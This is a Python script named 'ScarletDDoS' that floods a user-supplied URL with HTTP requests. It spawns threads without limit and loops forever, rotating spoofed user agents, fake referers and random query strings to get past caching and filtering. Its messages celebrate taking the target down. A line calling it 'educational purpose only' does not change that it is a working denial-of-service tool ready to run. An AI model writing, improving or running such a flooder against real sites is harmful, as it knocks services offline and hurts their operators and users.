import os
import requests
import threading
import random

########################################
#       Educational purpose only       #
########################################

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")


url = input("URL:  ").strip()


count = 0
headers = []
referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
]


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
    headers.append("Mozilla/5.0 (Linux; U; Android 8.1.0; id-id; Redmi 6A Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.7.3")
    headers.append("Mozilla/5.0 (Linux; U; Android 4.3; pt-pt; 6014X Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30")
    headers.append("Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 10; vivo 1907_19) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 10; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36 OPR/61.2.3076.56749")
    headers.append("Mozilla/5.0 (Linux; Android 8.0.0; ATU-LX3 Build/HUAWEIATU-LX3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 UMCE/v1.6_240-android")
    headers.append("Mozilla/5.0 (Linux; Android 10; YAL-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 11; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 9; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 6.0; NXT-L09 Build/HUAWEINXT-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 UCURSOS/v1.5.4_223-android")
    headers.append("Dalvik/1.6.0 (Linux; U; Android 4.4.2; MS5.V2 Build/MS5.V2)")
    headers.append("Mozilla/5.0 (Linux; Android 8.1.0; PM45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4647.2 Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 10; SM-A315F; U; en) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Tenta/4.0.52 Build/2682 Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 10; SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.04.4.4995")
    headers.append("Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36")
    headers.append("Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J3109 Build/LMY47X)")
    headers.append("Mozilla/5.0 (Linux; Android 9; LM-G710VM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; arm; Android 6.0; C4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 YaBrowser/20.4.4.66.00 (beta) SA/0 TA/7.1 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QQ2A.200405.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; U; Android 9; en-US; RMX1941 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTBS29.401-58-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTBS29.401-58-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.361")
    headers.append("Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F916U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 8.0.0; MI 5s Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 8.1.0; vivo 1908_19) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 10; SM-G960U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36")
    headers.append("Dalvik/2.1.0 (Linux; U; Android 9; Notepad_K10 Build/PPR1.180610.011)")
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.1.4322; wbxapp 1.0.0; Microsoft Outlook 15.0.4701; Microsoft Outlook 15.0.4701; ms-office; MSOffice 15)")
    headers.append("Mozilla/5.0 (Linux; Android 5.1.1; SM-J500H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Linux; Android 11; SM-N970U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36")
    headers.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36,gzip(gfe)")
    
    
    
    


    
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")

    return headers


def genstr(size):
    out_str = ''

    for _ in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers)
                count += 1
                print ("{0} ScarletDDoS Sent".format(count))
            except requests.exceptions.ConnectionError:
                print ("Tao Nghĩ Là Sập Rồi")
                pass
            except requests.exceptions.InvalidSchema:
                print ("[URL Error]")
                raise SystemExit()
            except ValueError:
                print ("[Sai URL EM ƠI]")
                raise SystemExit()
            except KeyboardInterrupt:
                print("[Canceled by User]")
                raise SystemExit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("[Canceled By User]")
        raise SystemExit()
